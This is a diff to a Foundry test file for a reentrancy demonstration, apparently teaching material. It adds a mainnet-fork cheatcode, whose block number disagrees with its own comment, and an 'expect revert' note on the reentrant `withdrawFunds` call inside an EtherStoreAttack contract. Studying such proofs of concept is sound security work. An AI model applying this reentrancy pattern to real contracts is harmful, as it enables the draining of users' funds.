@@ -2,6 +2,7 @@
 pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
+import "./interface.sol";
 
 /*
 Name: Reentrancy Vulnerability
@@ -97,9 +98,11 @@ contract ContractTest is Test {
 
 contract EtherStoreAttack is Test {
     EtherStore store;
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     constructor(address _store) {
         store = EtherStore(_store);
+        cheats.createSelectFork("mainnet", 12_516_705); //fork mainnet at block 13715025
     }
 
     function Attack() public {
@@ -124,7 +127,7 @@ contract EtherStoreAttack is Test {
         console.log("Attack contract balance", address(this).balance);
         console.log("EtherStore balance", address(store).balance);
         if (address(store).balance >= 1 ether) {
-            store.withdrawFunds(1 ether); // exploit here
+            store.withdrawFunds(1 ether); // exploit here        //expect revert
         }
     }
 }
